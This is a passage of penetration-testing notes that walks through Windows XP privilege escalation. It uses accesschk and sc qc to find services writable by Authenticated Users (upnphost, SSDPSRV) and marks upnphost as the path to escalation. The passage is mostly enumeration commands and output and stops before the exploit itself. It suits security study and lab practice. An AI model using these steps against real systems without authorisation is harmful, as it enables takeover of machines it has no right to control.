
**Look for vulnerable services we can exploit**
```
C:\Inetpub\Scripts>accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# If we are on a Windows XP SP0 or SP1 OS we will receive the following output

RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS
```
*The output (`SERVICE_ALL_ACCESS`) implies that we have access to two services from which we can edit the service parameters, named `upnphost` and `SSDPSRV`.*

**Closer look at both services**
```
C:\Inetpub\Scripts>accesschk.exe /accepteula -ucqv SSDPSRV

SSDPSRV
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\LOCAL SERVICE
        SERVICE_ALL_ACCESS
        
C:\Inetpub\Scripts>accesschk.exe /accepteula -ucqv upnphost

upnphost
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\LOCAL SERVICE
        SERVICE_ALL_ACCESS    
```

```
# upnphost								 
								 
C:\> sc qc upnphost
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Universal Plug and Play Device Host
	DEPENDENCIES       : SSDPSRV
        SERVICE_START_NAME : NT AUTHORITY\LocalService		
								 

# SSDPSRV								 
C:\> sc qc SSDPSRV
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: SSDPSRV
        TYPE               : 20  WIN32_SHARE_PROCESS 
	START_TYPE         : 4   DISABLED
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : SSDP Discovery Service   
        DEPENDENCIES       :   
        SERVICE_START_NAME : NT AUTHORITY\LocalService
```
`upnphost` is the service we are going to use to escalate our privileges. As you can see upnphost has a dependency, it requires `SSDPSRV` to run aswel. If we take a look at the current status of SSDPSRV with the command sc query SSDPSRV we can see that the service is currently `STOPPED`.